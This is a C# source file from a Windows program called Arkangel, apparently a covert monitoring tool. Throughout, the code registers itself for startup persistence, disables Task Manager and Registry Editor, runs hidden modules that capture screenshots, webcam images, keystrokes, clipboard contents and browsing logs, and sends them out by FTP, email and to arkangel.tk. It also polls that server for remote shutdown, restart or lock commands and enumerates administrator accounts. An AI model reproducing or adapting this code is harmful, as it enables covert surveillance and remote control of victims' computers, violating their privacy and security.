using Ionic.Zip;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows;
using System.Windows.Media.Imaging;

namespace Arkangel
{
    public static class Functions
    {
        public static void AddApplicationToCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }
        public static void AddApplicationToAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }
        public static string Login( string username,string passsword)
        {
            try
            {
                string formUrl = "http://www.arkangel.tk/logginUpload"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
                WebClient wc = new WebClient();
                byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
                {
                      {"email",username},
                      {"password",passsword}
                 });
                string _response = Encoding.ASCII.GetString(resp);
                Console.WriteLine(_response);
                return _response;
            }
            catch
            {
                return "Error";
            }
        }
        public static string Signup(string username, string passsword)
        {
            try
            {
                string formUrl = "http://www.arkangel.tk/signupUpload"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
                WebClient wc = new WebClient();
                byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
                {
                      {"email",username},
                      {"password",passsword}
                 });
                string _response = Encoding.ASCII.GetString(resp);
                Console.WriteLine(_response);
                return _response;
            }
            catch
            {
                return "Error";
            }
        }
        public static string remoteWin(string mode)
        {
            try
            {
                string email = GetMail();
                string token = Gettoken();
                string formUrl = "http://www.arkangel.tk/remote-method"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
                WebClient wc = new WebClient();
                byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
                {
                      {"email",email},
                      {"token",token},
                      {"mode",mode}
                 });
                string _response = Encoding.ASCII.GetString(resp);
                Console.WriteLine(_response);
                return _response;
            }
            catch
            {
                return "Error";
            }
        }
        public static string Gettoken()
        {
            string token="";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {

                   
                    SQLiteCommand sqlCom = new SQLiteCommand(@"SELECT token from current_user", connect);
                    SQLiteDataReader rr = sqlCom.ExecuteReader();
                    while (rr.Read())
                    {
                       token= rr["token"].ToString();
                    }
                }
            }
            return token ;
        }
        public static string GetMail()
        {
            string mail = "";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {

                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT username from Users where id = (select id from current_user)", connect);
                    SQLiteDataReader r = sqlComm.ExecuteReader();
                    while (r.Read())
                    {
                        mail = r["username"].ToString();
                    }
                }
                connect.Close();
            }
            return mail;
        }
        public static bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }
            catch (Exception ex)
            {
                isAdmin = false;
            }
            return isAdmin;
        }

        /// <summary>
        /// Disable or enable task manager. need to restart to confirm
        /// </summary>
        /// <param name="enable"></param> if enable = true => delete registry and restart
        public static void SetTaskManager(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "0", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                }

        }

        // edit group policy to disable Registry editor
        public static void PreventAccessRegistryEditor(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "0", RegistryValueKind.DWord);
                }
 
        }

        public static void ZipFolder(string dir, string password)
        {
            using (ZipFile zip = new ZipFile())
            {
                if (Directory.Exists(dir))
                {
                    if (password!="") zip.Password = password;
                    zip.AddDirectory(dir + "\\");
                    zip.Save(dir + ".zip");
                }
            }
        }
        //ZipWebcam
        public static void ZipFolderWebsite()
        {
            DateTime mydate = DateTime.Now;
            string date = mydate.ToString("yyyy_MM_dd");
            using (ZipFile zip = new ZipFile())
            {
                if (Directory.Exists(GetpathWU()+"\\Website"))
                {
                    zip.AddDirectory(GetpathWU() + "\\Website");
                    zip.Save(GetpathWU()+"\\"+date +"-"+GetMail()+"-"+Gettoken()+ ".zip");
                }
            }
        }
        //Timer Remote
        public static void SetTimerRemote(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_Remote = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_Remote.Elapsed += OnTimedEventRemote;
                MainWindow.aTimer_Remote.AutoReset = true;
                MainWindow.aTimer_Remote.Enabled = true;
            }
            catch { }
        }
        [DllImport("user32")]
        public static extern void LockWorkStation();
        [DllImport("PowrProf.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool SetSuspendState(bool hiberate, bool forceCritical, bool disableWakeEvent);
        public static void OnTimedEventRemote(Object source, ElapsedEventArgs e)
        {
            controlRemote();
        }
        public static void controlRemote()
        {
            try
            {
                string checkRemote = remoteWin("0");
                if (checkRemote != "none" && checkRemote != "Error")
                {
                    if (checkRemote == "shutdown") Process.Start("shutdown", "/s /t 0");
                    if (checkRemote == "restart") Process.Start("shutdown", "/r /t 0");
                    if (checkRemote == "logoff") LockWorkStation();
                    if (checkRemote == "sleep") SetSuspendState(false, true, true);
                }
            }
            catch { }
        }
        //Timer for FTP
        public static void SetTimerFTP(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_FTP = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_FTP.Elapsed += OnTimedEventFTP;
                MainWindow.aTimer_FTP.AutoReset = true;
                MainWindow.aTimer_FTP.Enabled = true;
            }
            catch { }
           
        }
        public static void OnTimedEventFTP(Object source, ElapsedEventArgs e)
        {
            try
            {
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {
                    connect.Open();
                    using (SQLiteCommand fmd = connect.CreateCommand())
                    {
                        SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
                        SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                        while (data.Read())
                        {
                            if (data["upScrshot"].ToString() == "1") Functions.ZipFolder(GetpathScrShot() + "\\Screenshot", "");
                            if (data["upWebcam"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Webcam", "");
                            if (data["upWebsite"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Website", "");
                        }
                    }
                }
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "ftp.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        // Timer for screenshot
        public static void SetTimerScreenShot(int _time)
        {
            // Create a timer with a two second interval.
            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
            // Hook up the Elapsed event for the timer. 
            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventScreenShot;
            MainWindow.aTimer_scrshot.AutoReset = true;
            MainWindow.aTimer_scrshot.Enabled = true;
        }
        public static string GetpathScrShot ()
        {
            string path="";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
                    SQLiteDataReader data = sqlComm.ExecuteReader();
                    while (data.Read())
                    {
                        path = data["screenshotLog"].ToString();
                    }
                }
                connect.Close();
            }
            return path;
        }
        public static string GetpathKeylog()
        {
            string path = "";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
                    SQLiteDataReader data = sqlComm.ExecuteReader();
                    while (data.Read())
                    {
                        path = data["textLog"].ToString();
                    }
                }
                connect.Close();
            }
            return path;
        }
        public static string GetpathWebcam()
        {
            string path = "";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
                    SQLiteDataReader data = sqlComm.ExecuteReader();
                    while (data.Read())
                    {
                        path = data["webcamLog"].ToString();
                    }
                }
                connect.Close();
            }
            return path;
        }
        public static string GetpathWU()
        {
            string path = "";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
                    SQLiteDataReader data = sqlComm.ExecuteReader();
                    while (data.Read())
                    {
                        path = data["websiteLog"].ToString();
                    }
                }
                connect.Close();
            }
            return path;
        }
        public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
        {
            try
            {
                try
                {
                    Functions.EndTask("upScreenshot.exe");
                }
                catch { }
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {
                    int Screenshot_enable = 0;
                    SQLiteCommand sqlComm_Screenshot = new SQLiteCommand(@"SELECT * FROM Screenshot,current_user WHERE Screenshot.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
                    while (data.Read())
                    {
                        int.TryParse(data["enable"].ToString(), out Screenshot_enable);
                       

                        DateTime temp_screenshot = DateTime.Parse(data["datetime"].ToString());
                        double days_screenshot = Double.Parse(data["daysDel"].ToString());

                        if (data["enDel"].ToString() == "1" && temp_screenshot.AddDays(days_screenshot).CompareTo(DateTime.Now) >= 0)
                        {
                            try
                            {
                                if (Directory.Exists(GetpathScrShot()))
                                {

                                    Directory.Delete(GetpathScrShot(), true);
                                    Console.WriteLine("Delete scr log successful!");
                                }
                            }
                            catch { }

                        }
                    }
                    if (Screenshot_enable==1)
                    {
                        ProcessStartInfo start = new ProcessStartInfo();
                        start.WorkingDirectory = @"..\..\module\";
                        start.FileName = "screenshot.exe";
                        start.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(start);

                        DirectoryInfo d = new DirectoryInfo(GetpathScrShot() + "\\Screenshot\\");//Assuming Test is your Folder
                        FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
                        foreach (FileInfo file in Files)
                        {
                            List<string> s = new List<string>();
                            s.Add(Gettoken());
                            ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s);
                            var jpeg = new JpegMetadataAdapter(GetpathScrShot() + "\\Screenshot\\" + file.Name);
                            //jpeg.Metadata.Comment = token;
                            jpeg.Metadata.Title = "A title";
                            jpeg.Metadata.Author = autho;
                            jpeg.Save();

                        }
                        try
                        {
                            ProcessStartInfo startupload = new ProcessStartInfo();
                            startupload.WorkingDirectory = @"..\..\module\";
                            startupload.FileName = "upScreenshot.exe";
                            startupload.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(startupload);
                        }
                        catch { }

                    }
                }


            }
            catch { }
            
           
        }
        public static void syncUp()
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sync_up.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }
        public static void EndTask(string taskname)
        {
            string processName = taskname;
            string fixstring = taskname.Replace(".exe", "");

            if (taskname.Contains(".exe"))
            {
                foreach (Process process in Process.GetProcessesByName(fixstring))
                {
                    process.Kill();
                }
            }
            else if (!taskname.Contains(".exe"))
            {
                foreach (Process process in Process.GetProcessesByName(processName))
                {
                    process.Kill();
                }
            }
        }
        public static void syncDown()
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sync.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }
        // Timer for Webcam
        public static void SetTimerWebcam(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
                MainWindow.aTimer_webcam.AutoReset = true;
                MainWindow.aTimer_webcam.Enabled = true;
            }
            catch { }
           
        }
        public static void SetTimerWebsite(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_Website = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_Website.Elapsed += OnTimedEventWebsite;
                MainWindow.aTimer_Website.AutoReset = true;
                MainWindow.aTimer_Website.Enabled = true;
            }
            catch { }
        }
        public static void Uptoken()
        {
            try
            {
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {
                    connect.Open();
                    using (SQLiteCommand fmd = connect.CreateCommand())
                    {
                        string username = "";
                        string password = "";
                        SQLiteCommand sqlComm1 = new SQLiteCommand(@"SELECT * from Users", connect);
                        SQLiteDataReader data = sqlComm1.ExecuteReader();
                        while (data.Read())
                        {
                            username = data["username"].ToString();
                            password = data["password"].ToString();
                        }
                        string _loginlog = Functions.Login(username, Base64Decode(password));
                        if (_loginlog != "Error")
                        {
                            SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * from current_user", connect);
                            SQLiteDataReader datacheck = sqlComm1.ExecuteReader();
                            while (datacheck.Read())
                            {
                                if (_loginlog != datacheck["token"].ToString())
                                {
                                    //Update token xuong database
                                    SQLiteCommand getid = new SQLiteCommand(@"UPDATE current_user SET id=1,token='" + _loginlog.Split('\"')[1] + "'", connect);
                                    getid.ExecuteNonQuery();
                                }
                            }
                        }
                    }
                }
            }
            catch { }
           
        }
        public static void OnTimedEventWebsite(Object source, ElapsedEventArgs e)
        {
            try
            {
                
                ZipFolderWebsite();
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upWebsite.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            } 
            catch { }
        }
        public static void SetTimerClipboard(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_Clipboard = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_Clipboard.Elapsed += OnTimedEventClipboard;
                MainWindow.aTimer_Clipboard.AutoReset = true;
                MainWindow.aTimer_Clipboard.Enabled = true;
            }
            catch { }
        }
        public static void OnTimedEventClipboard(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upClipboardImg.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upClipboardText.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
            try
            {
                syncDown();
            }
            catch { }
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upKeystroke.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }

        }
        public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
        {
            try
            {
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {

                    try
                    {
                        Functions.EndTask("upWebcamLog.exe");
                    }
                    catch { }
                    int Wc_enable = 0;
                    SQLiteCommand sqlComm_Screenshot = new SQLiteCommand(@"SELECT * FROM Webcam", connect);
                    SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
                    while (data.Read())
                    {
                        int.TryParse(data["enable"].ToString(), out Wc_enable);
                    }
                    if (Wc_enable == 1)
                    {
                        ProcessStartInfo start = new ProcessStartInfo();
                        start.WorkingDirectory = @"..\..\module\";
                        start.FileName = "webcam.exe";
                        start.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(start);

                        DirectoryInfo d = new DirectoryInfo(GetpathWebcam() + "\\Webcam\\");//Assuming Test is your Folder
                        FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
                        foreach (FileInfo file in Files)
                        {
                            List<string> s = new List<string>();
                            s.Add(Gettoken());
                            ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s);
                            var jpeg = new JpegMetadataAdapter(GetpathWebcam() + "\\Webcam\\" + file.Name);
                            //jpeg.Metadata.Comment = token;
                            jpeg.Metadata.Title = "A title";
                            jpeg.Metadata.Author = autho;
                            jpeg.Save();

                            try
                            {
                                ProcessStartInfo startupload = new ProcessStartInfo();
                                startupload.WorkingDirectory = @"..\..\module\";
                                startupload.FileName = "upWebcamLog.exe";
                                startupload.WindowStyle = ProcessWindowStyle.Hidden;
                                Process.Start(startupload);
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }
        }
        //Timer for FTP
       



        // Timer for Send mail
        public static void SetTimerSendMail(int _time)
        {
            try
            {
                MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
                MainWindow.aTimer_sendMail.AutoReset = true;
                MainWindow.aTimer_sendMail.Enabled = true;
            }
            catch { }
            // Create a timer with a two second interval.
           
        }
        public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
        {
            
            try
            {
                string enable_mail = "";
                string password = null;
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {
                    connect.Open();
                    using (SQLiteCommand fmd = connect.CreateCommand())
                    {
                        SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM Email,current_user WHERE Email.id = current_user.id", connect);
                        SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                        while (data.Read())
                        {
                            enable_mail = data["enable"].ToString();
                            password = data["zipPasswd"].ToString();
                            if (data["upScrshot"].ToString() == "1") Functions.ZipFolder(GetpathScrShot() + "\\Screenshot", password);
                            if (data["upWebcam"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Webcam", password);
                            if (data["upWebsite"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Website", password);
                        }
                    }
                }
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sendMail.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        public static void FindUsers()
        {
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT user_list.user FROM user_list,current_user WHERE user_list.id = current_user.id", connect);
                    object re = sqlComm_Alert.ExecuteScalar();
                    if (re == null)
                    {
                        DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
                        DirectoryEntry admGroup = localMachine.Children.Find("administrators", "group");
                        object members = admGroup.Invoke("members", null);
                        foreach (object groupMember in (IEnumerable)members)
                        {
                            DirectoryEntry member = new DirectoryEntry(groupMember);

                            SQLiteCommand sqlConn = new SQLiteCommand(@"INSERT INTO user_list VALUES ((SELECT id FROM current_user),'" + member.Name.ToString() + "')", connect);
                            sqlConn.ExecuteNonQuery();
                        }

                    }
                    connect.Close();
                }
            }
        }

        public static void CheckUser()
        {
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM monitor_user,current_user WHERE monitor_user.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                    while (data.Read())
                    {
                        if (data["enable"].ToString() == "2") //Monitor current user
                        {
                            if (data["current_user"].ToString() != Environment.UserName)
                                Environment.Exit(Environment.ExitCode);
                        }

                        if (data["enable"].ToString() == "3") //Monitor following user
                        {
                            SQLiteCommand sqlConn = new SQLiteCommand(@"SELECT * FROM user_list,current_user WHERE user_list.id = current_user.id", connect);
                            SQLiteDataReader list = sqlConn.ExecuteReader();
                            int flag = 0;
                            while (list.Read())
                            {
                                if (list["user"].ToString() == Environment.UserName)
                                    flag = 1;
                            }

                            if (flag == 0)
                            {
                                Environment.Exit(Environment.ExitCode);
                            }
                        }
                    }
                }
            }
        }
        public static void WriteClipboard()
        {
            DateTime mydate = DateTime.Now;
            string date = mydate.ToString("yyyy_MM_dd");
            string time = mydate.ToString("HH_mm_ss");
            File.AppendAllText(@"..\\..\\Clipboard\\" + date + "-" + GetMail() + "-" + Gettoken() + ".txt","\n"+time+"\n"+Clipboard.GetText());

            BitmapSource image = null;
            image = System.Windows.Clipboard.GetImage();
            if (image != null)
            {
                DateTime datetime = DateTime.Now;
                string alldate = mydate.ToString("yyyy_MM_dd-HH_mm_ss");
                string name = alldate + "-" + GetMail() + ".jpeg";
                string filename = System.IO.Path.Combine("..\\..\\Clipboard", name);
                using (var fileStream = new FileStream(filename, FileMode.Create))
                {
                    BitmapEncoder encoder = new JpegBitmapEncoder();
                    encoder.Frames.Add(BitmapFrame.Create(image));
                    encoder.Save(fileStream);
                }
                List<string> s = new List<string>();
                s.Add(Gettoken());
                ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s); ;
                var jpeg = new JpegMetadataAdapter(filename);
                //jpeg.Metadata.Comment = token;
                jpeg.Metadata.Title = "A title";
                jpeg.Metadata.Author = autho;
                jpeg.Save();
            }
        }

        public static string ComputeHash(string plainText, byte[] saltBytes)
        {
            
            // Convert plain text into a byte array.
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            // Allocate array, which will hold plain text and salt.
            byte[] plainTextWithSaltBytes =  new byte[plainTextBytes.Length + saltBytes.Length];

            // Copy plain text bytes into resulting array.
            for (int i = 0; i < plainTextBytes.Length; i++)
                plainTextWithSaltBytes[i] = plainTextBytes[i];

            // Append salt bytes to the resulting array.
            for (int i = 0; i < saltBytes.Length; i++)
                plainTextWithSaltBytes[plainTextBytes.Length + i] = saltBytes[i];

            // create hash type
            HashAlgorithm hash = new SHA256Managed();

            // Compute hash value of our plain text with appended salt.
            byte[] hashBytes = hash.ComputeHash(plainTextWithSaltBytes);

            // Create array which will hold hash and original salt bytes.
            byte[] hashWithSaltBytes = new byte[hashBytes.Length +   saltBytes.Length];

            // Copy hash bytes into resulting array.
            for (int i = 0; i < hashBytes.Length; i++)
                hashWithSaltBytes[i] = hashBytes[i];

            // Append salt bytes to the result.
            for (int i = 0; i < saltBytes.Length; i++)
                hashWithSaltBytes[hashBytes.Length + i] = saltBytes[i];

            // Convert result into a base64-encoded string.
            string hashValue = Convert.ToBase64String(hashWithSaltBytes);

            // Return the result.
            return hashValue;
        }

        public static bool VerifyHash(string plainText, string hashValue)
        {
            // Convert base64-encoded hash value into a byte array.
            byte[] hashWithSaltBytes = Convert.FromBase64String(hashValue);

            // We must know size of hash (without salt).
            int hashSizeInBits = 256;
            
            // Convert size of hash from bits to bytes.
            int hashSizeInBytes = hashSizeInBits / 8;

            // Make sure that the specified hash value is long enough.
            if (hashWithSaltBytes.Length < hashSizeInBytes)
                return false;

            // Allocate array to hold original salt bytes retrieved from hash.
            byte[] saltBytes = new byte[hashWithSaltBytes.Length - hashSizeInBytes];

            // Copy salt from the end of the hash to the new array.
            for (int i = 0; i < saltBytes.Length; i++)
                saltBytes[i] = hashWithSaltBytes[hashSizeInBytes + i];

            // Compute a new hash string.
            string expectedHashString = ComputeHash(plainText, saltBytes);

            // If the computed hash matches the specified hash,
            // the plain text value must be correct.
            Console.WriteLine("hash value: " + hashValue);
            Console.WriteLine("hash expected : " + expectedHashString);
            return (hashValue == expectedHashString);
        }
        public static Image SetImageComment(Image image, string comment)
        {
            using (var memStream = new MemoryStream())
            {
                image.Save(memStream, ImageFormat.Jpeg);
                memStream.Position = 0;
                var decoder = new JpegBitmapDecoder(memStream, BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.OnLoad);
                BitmapMetadata metadata;
                if (decoder.Metadata == null)
                {
                    metadata = new BitmapMetadata("jpg");
                }
                else
                {
                    metadata = decoder.Metadata;
                }

                metadata.Comment = comment;

                var bitmapFrame = decoder.Frames[0];
                BitmapEncoder encoder = new JpegBitmapEncoder();
                encoder.Frames.Add(BitmapFrame.Create(bitmapFrame, bitmapFrame.Thumbnail, metadata, bitmapFrame.ColorContexts));

                var imageStream = new MemoryStream();
                encoder.Save(imageStream);
                imageStream.Position = 0;
                image.Dispose();
                image = null;
                return Image.FromStream(imageStream);
            }
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
    }
}
